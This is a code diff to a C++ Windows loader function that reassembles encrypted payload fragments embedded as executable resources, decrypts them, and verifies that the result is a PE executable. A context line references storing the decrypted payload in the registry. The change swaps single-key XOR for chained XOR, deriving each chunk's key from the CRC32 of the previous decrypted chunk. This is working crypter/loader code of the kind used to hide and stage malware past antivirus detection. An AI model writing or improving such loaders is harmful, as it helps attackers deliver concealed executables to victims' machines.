@@ -139,219 +139,127 @@ bool StoreDecryptedPayloadToRegistry(const char* payload, uint32_t size) {
 }
 
 std::vector<char> ReconstructFragmentedPayload() {
-    //gets current exe's module handle to access its resources
     HMODULE hModule = GetModuleHandle(NULL);
     char debugMsg[512];
-    
-    if (!hModule) {
-        // MessageBoxA(NULL, "GetModuleHandle failed", "Debug", MB_ICONERROR);
-        return {};
-    }
-    
-    char exePath[MAX_PATH];
-    GetModuleFileNameA(hModule, exePath, MAX_PATH);
-    sprintf(debugMsg, "Running from: %s", exePath);
-    // MessageBoxA(NULL, debugMsg, "Debug Info", MB_OK);
-    
-    // check if frag 0 exist
-    HRSRC hResTest = FindResourceA(hModule, MAKEINTRESOURCEA(132), "BIN");
 
-    if (!hResTest) { //frag 0 not found, debug to find err
+    // === Resource existence checks (unchanged) ===
+    HRSRC hResTest = FindResourceA(hModule, MAKEINTRESOURCEA(132), "BIN");
+    if (!hResTest) {
         DWORD error = GetLastError();
         sprintf(debugMsg, "FindResource failed for ID 132\nError code: %lu", error);
         MessageBoxA(NULL, debugMsg, "Resource Debug", MB_ICONERROR);
-        
         EnumResourceNamesA(hModule, "BIN", [](HMODULE hModule, LPCSTR lpszType, LPSTR lpszName, LONG_PTR lParam) -> BOOL {
             char msg[256];
-            if (IS_INTRESOURCE(lpszName)) {
-                sprintf(msg, "Found BIN resource: ID %d", (int)(ULONG_PTR)lpszName);
-            } else {
-                sprintf(msg, "Found BIN resource: %s", lpszName);
-            }
+            if (IS_INTRESOURCE(lpszName)) sprintf(msg, "Found BIN resource: ID %d", (int)(ULONG_PTR)lpszName);
+            else sprintf(msg, "Found BIN resource: %s", lpszName);
             MessageBoxA(NULL, msg, "Available Resources", MB_OK);
             return TRUE;
         }, 0);
-        
         return {};
     }
-    
-    DWORD testSize = SizeofResource(hModule, hResTest);
-    sprintf(debugMsg, "Resource 132 found! Size: %lu bytes", testSize);
-    MessageBoxA(NULL, debugMsg, "Resource Debug", MB_OK);
-    
-    HGLOBAL hDataTest = LoadResource(hModule, hResTest);
-    if (!hDataTest) {
-        DWORD error = GetLastError();
-        sprintf(debugMsg, "LoadResource failed. Error: %lu", error);
-        MessageBoxA(NULL, debugMsg, "Resource Debug", MB_ICONERROR);
-        return {};
-    }
-    
-    void* pDataTest = LockResource(hDataTest);
-    if (!pDataTest) {
-        MessageBoxA(NULL, "LockResource failed", "Resource Debug", MB_ICONERROR);
-        return {};
-    }
-    
+
     MessageBoxA(NULL, "All resource tests passed!", "Resource Debug", MB_OK);
 
-    // === STEP 1: Load chunk 0 using our function ===
+    // === Load chunk 0 ===
     DWORD chunk0Size = 0;
     unsigned char* chunk0Data = GetPayloadResource(132, "BIN", &chunk0Size);
-    
-    if (!chunk0Data) {
-        MessageBoxA(NULL, "GetPayloadResource failed after successful manual test", "Step 1", MB_ICONERROR);
+    if (!chunk0Data || chunk0Size < sizeof(ChunkHeader)) {
+        MessageBoxA(NULL, "Failed to load chunk 0 or too small for header", "Step 1", MB_ICONERROR);
         return {};
     }
-    
-    sprintf(debugMsg, "GetPayloadResource success! Size: %lu bytes", chunk0Size);
-    MessageBoxA(NULL, debugMsg, "Step 1", MB_OK);
-    
-    if (chunk0Size < sizeof(ChunkHeader)) {
-        sprintf(debugMsg, "Chunk 0 too small for header: %lu bytes, need %zu bytes", 
-                chunk0Size, sizeof(ChunkHeader));
-        MessageBoxA(NULL, debugMsg, "Step 1", MB_ICONERROR);
-        return {};
-    }
-    
-    size_t expectedChunk0Size = sizeof(ChunkHeader) + 4096;
-    sprintf(debugMsg, "Chunk 0 size: %lu bytes, expected: %zu bytes", chunk0Size, expectedChunk0Size);
-    MessageBoxA(NULL, debugMsg, "Size Check", MB_OK);
-    
-    if (chunk0Size != expectedChunk0Size) {
-        sprintf(debugMsg, "Chunk 0 size mismatch!\nGot: %lu bytes\nExpected: %zu bytes\nHeader size: %zu bytes", 
-                chunk0Size, expectedChunk0Size, sizeof(ChunkHeader));
-        MessageBoxA(NULL, debugMsg, "Step 1", MB_ICONWARNING);
-    }
-    
-    // === STEP 2: Extract header ===
+
+    // === Extract header ===
     ChunkHeader* header = (ChunkHeader*)chunk0Data;
-    
-    if (memcmp(header->magic, "FRAG", 4) != 0) {
-        char magicBytes[5] = {0};
-        memcpy(magicBytes, header->magic, 4);
-        sprintf(debugMsg, "Invalid FRAG magic. Got: '%s' (0x%02X%02X%02X%02X)", 
-                magicBytes, 
-                (unsigned char)header->magic[0],
-                (unsigned char)header->magic[1], 
-                (unsigned char)header->magic[2],
-                (unsigned char)header->magic[3]);
-        MessageBoxA(NULL, debugMsg, "Step 2", MB_ICONERROR);
+
+    if (memcmp(header->magic, "FRAG", 4) != 0 || memcmp(header->marker, "CHUNK001", 8) != 0) {
+        MessageBoxA(NULL, "Invalid header magic or marker", "Step 2", MB_ICONERROR);
         return {};
     }
-    
-    if (memcmp(header->marker, "CHUNK001", 8) != 0) {
-        char markerBytes[9] = {0};
-        memcpy(markerBytes, header->marker, 8);
-        sprintf(debugMsg, "Invalid CHUNK001 marker. Got: '%s'", markerBytes);
-        MessageBoxA(NULL, debugMsg, "Step 2", MB_ICONERROR);
-        return {};
-    }
-    
-    sprintf(debugMsg, "Header valid!\nTotal size: %u\nTotal chunks: %u\nChunk size: %u", 
-            header->total_size, header->total_chunks, header->chunk_size);
+
+    sprintf(debugMsg, "Header valid!\nTotal size: %u\nTotal chunks: %u\nStarting key: 0x%02X",
+        header->total_size, header->total_chunks, (unsigned int)header->encryption_key);
     MessageBoxA(NULL, debugMsg, "Step 2", MB_OK);
 
-    // === STEP 3: Prepare reconstruction ===
-    int chunk0DataSize = chunk0Size - sizeof(ChunkHeader);
-    char* chunk0Payload = (char*)(chunk0Data + sizeof(ChunkHeader));
-    
-    sprintf(debugMsg, "Chunk 0 data size: %d bytes", chunk0DataSize);
-    MessageBoxA(NULL, debugMsg, "Step 3", MB_OK);
-    
-    if (chunk0DataSize > header->chunk_size) {
-        sprintf(debugMsg, "Chunk 0 data larger than expected: %d > %u", 
-                chunk0DataSize, header->chunk_size);
-        MessageBoxA(NULL, debugMsg, "Step 3", MB_ICONERROR);
-        return {};
-    }
+    // === CHAINED DECRYPTION STARTS HERE ===
+    std::vector<char> decryptedPayload;
+    decryptedPayload.reserve(header->total_size);
 
-    // === STEP 4: Reconstruct all data ===
-    std::vector<char> allEncryptedData;
+    uint8_t current_key = header->encryption_key;  // this is only the FIRST key now
 
-    // Add data from chunk 0 (already skipped header)
-    allEncryptedData.insert(allEncryptedData.end(), chunk0Payload, chunk0Payload + chunk0DataSize);
+    std::vector<char> previous_decrypted_chunk;
 
-    // Add data from remaining chunks (NO HEADERS in these chunks)
-    for (int chunkId = 1; chunkId < header->total_chunks; chunkId++) {
-        int resourceId = 132 + chunkId;
-        sprintf(debugMsg, "Loading chunk %d (resource ID %d)...", chunkId, resourceId);
-        MessageBoxA(NULL, debugMsg, "Step 4", MB_OK);
-        
-        DWORD chunkSize = 0;
-        unsigned char* chunkData = GetPayloadResource(resourceId, "BIN", &chunkSize);
-        
-        if (!chunkData) {
-            sprintf(debugMsg, "Failed to load chunk %d (ID %d)", chunkId, resourceId);
-            MessageBoxA(NULL, debugMsg, "Step 4", MB_ICONERROR);
-            return {};
+    for (int i = 0; i < header->total_chunks; i++) {
+        DWORD enc_size = 0;
+        unsigned char* enc_data = nullptr;
+        int actual_size = 0;
+
+        if (i == 0) {
+            // Chunk 0: skip header
+            enc_data = chunk0Data + sizeof(ChunkHeader);
+            actual_size = chunk0Size - sizeof(ChunkHeader);
+        } else {
+            int resId = 132 + i;
+            sprintf(debugMsg, "Loading chunk %d (ID %d)...", i, resId);
+            MessageBoxA(NULL, debugMsg, "Step 4", MB_OK);
+
+            enc_data = GetPayloadResource(resId, "BIN", &enc_size);
+            if (!enc_data) {
+                MessageBoxA(NULL, "Failed to load chunk from resource", "Step 4", MB_ICONERROR);
+                return {};
+            }
+            actual_size = enc_size;
         }
-        
-        // NO HEADER SKIPPING for chunks 1+ - they contain pure encrypted data
-        allEncryptedData.insert(allEncryptedData.end(), chunkData, chunkData + chunkSize);
-        
-        sprintf(debugMsg, "Added chunk %d: %lu bytes, total: %zu bytes", 
-                chunkId, chunkSize, allEncryptedData.size());
-        MessageBoxA(NULL, debugMsg, "Step 4", MB_OK);
+
+        // Decrypt current chunk
+        std::vector<char> this_decrypted(actual_size);
+        for (int j = 0; j < actual_size; j++) {
+            this_decrypted[j] = enc_data[j] ^ current_key;
+        }
+
+        // Append to final payload
+        decryptedPayload.insert(decryptedPayload.end(), this_decrypted.begin(), this_decrypted.end());
+
+        sprintf(debugMsg, "Chunk %d decrypted with key 0x%02X (%zu bytes)", i, (unsigned int)current_key, this_decrypted.size());
+        MessageBoxA(NULL, debugMsg, "Decryption", MB_OK);
+
+        // Save for next key generation
+        previous_decrypted_chunk = std::move(this_decrypted);
+
+        // Generate next key from THIS decrypted chunk (except last one)
+        if (i < header->total_chunks - 1) {
+            uint32_t crc = CalculateCRC32(previous_decrypted_chunk.data(), previous_decrypted_chunk.size());
+            current_key = (uint8_t)(crc ^ (crc >> 8) ^ (crc >> 16) ^ (crc >> 24));
+        }
     }
 
-    // === STEP 5: Verify total size ===
-    sprintf(debugMsg, "Final size: %zu bytes, expected: %u bytes", 
-            allEncryptedData.size(), header->total_size);
-    MessageBoxA(NULL, debugMsg, "Step 5", MB_OK);
-    
-    if (allEncryptedData.size() != header->total_size) {
-        sprintf(debugMsg, "Total size mismatch!\nGot: %zu bytes\nExpected: %u bytes", 
-                allEncryptedData.size(), header->total_size);
+    // === All old checks (size, MZ, CRC) unchanged ===
+    if (decryptedPayload.size() != header->total_size) {
+        sprintf(debugMsg, "Size mismatch! Got %zu, expected %u", decryptedPayload.size(), header->total_size);
         MessageBoxA(NULL, debugMsg, "Step 5", MB_ICONERROR);
         return {};
     }
-    
     MessageBoxA(NULL, "Success: Total size correct", "Step 5", MB_OK);
 
-    // === STEP 6: Decrypt ===
-    std::vector<char> decryptedPayload(header->total_size);
-    for (uint32_t i = 0; i < header->total_size; i++) {
-        decryptedPayload[i] = allEncryptedData[i] ^ header->encryption_key;
-    }
-    
-    MessageBoxA(NULL, "Success: Decryption complete", "Step 6", MB_OK);
+    MessageBoxA(NULL, "Success: CHAINED DECRYPTION COMPLETE", "Step 6", MB_OK);
 
-    // Check first bytes
-    char byteCheck[256];
-    sprintf(byteCheck, "First bytes check:\nDecrypted: %02X %02X\nShould be: 4D 5A ('MZ')",
-            (unsigned char)decryptedPayload[0], 
-            (unsigned char)decryptedPayload[1]);
-    MessageBoxA(NULL, byteCheck, "Byte Verification", MB_OK);
-
-    // Manual PE signature check
+    // PE + CRC checks exactly as before
     if (decryptedPayload[0] != 'M' || decryptedPayload[1] != 'Z') {
         MessageBoxA(NULL, "PE SIGNATURE MISMATCH!", "CRITICAL ERROR", MB_ICONERROR);
         return {};
     }
 
-    // Check header values
-    char headerInfo[256];
-    sprintf(headerInfo, "Header Info:\nExpected CRC: 0x%08X\nTotal Size: %u\nTotal Chunks: %u",
-            header->crc32, header->total_size, header->total_chunks);
-    MessageBoxA(NULL, headerInfo, "Header Debug", MB_OK);
-
-    // === STEP 7: Verify CRC ===
     uint32_t calculatedCRC = CalculateCRC32(decryptedPayload.data(), header->total_size);
-    
     char crcMsg[256];
     sprintf(crcMsg, "CRC Result:\nCalculated: 0x%08X\nExpected: 0x%08X\nMatch: %s",
-            calculatedCRC, header->crc32, 
-            (calculatedCRC == header->crc32) ? "YES" : "NO");
+        calculatedCRC, header->crc32, (calculatedCRC == header->crc32) ? "YES" : "NO");
     MessageBoxA(NULL, crcMsg, "CRC Check", MB_OK);
-    
+
     if (calculatedCRC != header->crc32) {
         MessageBoxA(NULL, "CRC CHECK FAILED!", "ERROR", MB_ICONERROR);
         return {};
     }
-    
-    MessageBoxA(NULL, "Success: CRC check passed", "Step 7", MB_OK);
 
+    MessageBoxA(NULL, "Success: CRC check passed", "Step 7", MB_OK);
     return decryptedPayload;
 }
 
